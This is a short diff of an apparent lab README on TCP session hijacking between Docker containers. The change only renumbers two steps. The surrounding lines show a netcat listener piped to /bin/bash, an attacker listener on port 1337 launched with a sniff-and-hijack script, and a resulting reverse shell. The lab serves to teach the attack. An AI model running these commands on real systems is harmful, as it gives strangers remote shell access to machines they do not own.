@@ -9,9 +9,9 @@
     docker run -it --network host --name Attacker myubuntu
 ### 4. Create NetCat Listener on Server Container
     nc -l 80 | /bin/bash
-### 6. Connect Client to Server
+### 5. Connect Client to Server
     nc 10.2.5.3 80
-### 5. Create NetCat Listener & Launch Hijack From Attacker Container
+### 6. Create NetCat Listener & Launch Hijack From Attacker Container
     nc -lnv 1337 & python3 sniff_and_hijack.py
 ### 7. Send any message from client to server to hijack the server
 ### 8. Reverse shell now active in attacker container, move to foreground with
